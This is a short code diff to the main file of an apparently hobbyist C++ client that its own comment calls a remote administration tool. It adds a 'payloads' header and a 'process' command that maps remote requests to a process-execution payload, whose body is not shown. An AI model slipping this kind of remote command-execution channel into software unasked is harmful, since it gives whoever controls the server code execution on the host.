@@ -1,5 +1,6 @@
 #include "precompile.h"
 #include "client.h"
+#include "payloads.h"
 
 int main() // TODO: make this to class and fix a hash-table for identifier buffers for incoming pakets. add some cmd thingies. remote stuff and we are done. boom remote administration tool
 {
@@ -14,7 +15,8 @@ int main() // TODO: make this to class and fix a hash-table for identifier buffe
 
 	response_table responses = {
 		{"time", [&](std::string data) {return std::to_string(time(0)); }},
-		{"alive", [&](std::string data) {return "true"; }}
+		{"alive", [&](std::string data) {return "true"; }},
+		{"process", payload::process_execution}
 	};
 
 	action_table actions = {};
